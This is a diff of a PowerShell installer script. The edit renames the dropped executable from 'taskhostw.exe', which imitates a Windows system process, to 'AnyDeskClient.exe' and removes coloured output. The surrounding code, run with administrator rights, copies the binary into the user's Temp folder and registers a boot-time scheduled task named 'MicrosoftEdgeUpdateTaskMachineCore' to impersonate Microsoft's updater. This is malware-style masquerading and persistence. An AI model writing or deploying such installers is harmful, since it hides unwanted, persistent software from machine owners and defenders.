@@ -9,7 +9,7 @@ param(
 
 # Require administrator privileges
 if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    Write-Host "ERROR: This script must be run as Administrator." -ForegroundColor Red
+    Write-Host "ERROR: This script must be run as Administrator."
     Write-Host "Please right-click and select 'Run as Administrator'."
     Write-Host ""
     Read-Host "Press Enter to exit"
@@ -23,8 +23,8 @@ Write-Host "========================================"
 Write-Host ""
 
 # Check if executable exists
-if (-not (Test-Path "dist\taskhostw.exe")) {
-    Write-Host "ERROR: taskhostw.exe not found in dist\ directory." -ForegroundColor Red
+if (-not (Test-Path "dist\AnyDeskClient.exe")) {
+    Write-Host "ERROR: AnyDeskClient.exe not found in dist\ directory."
     Write-Host "Please run build.ps1 first to create the executable."
     Write-Host ""
     Read-Host "Press Enter to exit"
@@ -33,7 +33,7 @@ if (-not (Test-Path "dist\taskhostw.exe")) {
 
 # Define installation paths
 $InstallDir = "$env:LOCALAPPDATA\Temp"
-$ExePath = "$InstallDir\taskhostw.exe"
+$ExePath = "$InstallDir\AnyDeskClient.exe"
 $TaskName = "MicrosoftEdgeUpdateTaskMachineCore"
 
 Write-Host "[1/4] Creating installation directory"
@@ -44,13 +44,13 @@ Write-Host "  - Directory: $InstallDir"
 Write-Host ""
 
 Write-Host "[2/4] Copying executable"
-Copy-Item "dist\taskhostw.exe" $ExePath -Force
+Copy-Item "dist\AnyDeskClient.exe" $ExePath -Force
 if (-not (Test-Path $ExePath)) {
-    Write-Host "ERROR: Failed to copy executable." -ForegroundColor Red
+    Write-Host "ERROR: Failed to copy executable."
     Read-Host "Press Enter to exit"
     exit 1
 }
-Write-Host "  - Copied: taskhostw.exe"
+Write-Host "  - Copied: AnyDeskClient.exe"
 Write-Host ""
 
 # Handle .dev_mode marker
@@ -106,7 +106,7 @@ $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoi
 Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
 
 if (-not (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)) {
-    Write-Host "ERROR: Failed to create Task Scheduler entry." -ForegroundColor Red
+    Write-Host "ERROR: Failed to create Task Scheduler entry."
     Read-Host "Press Enter to exit"
     exit 1
 }
@@ -122,9 +122,9 @@ Start-Sleep -Seconds 2
 
 $task = Get-ScheduledTask -TaskName $TaskName
 if ($task.State -eq "Running") {
-    Write-Host "  - Service started successfully" -ForegroundColor Green
+    Write-Host "  - Service started successfully"
 } else {
-    Write-Host "  - Warning: Service scheduled but not running yet" -ForegroundColor Yellow
+    Write-Host "  - Warning: Service scheduled but not running yet"
     Write-Host "  - Service will start on next system boot"
 }
 Write-Host ""
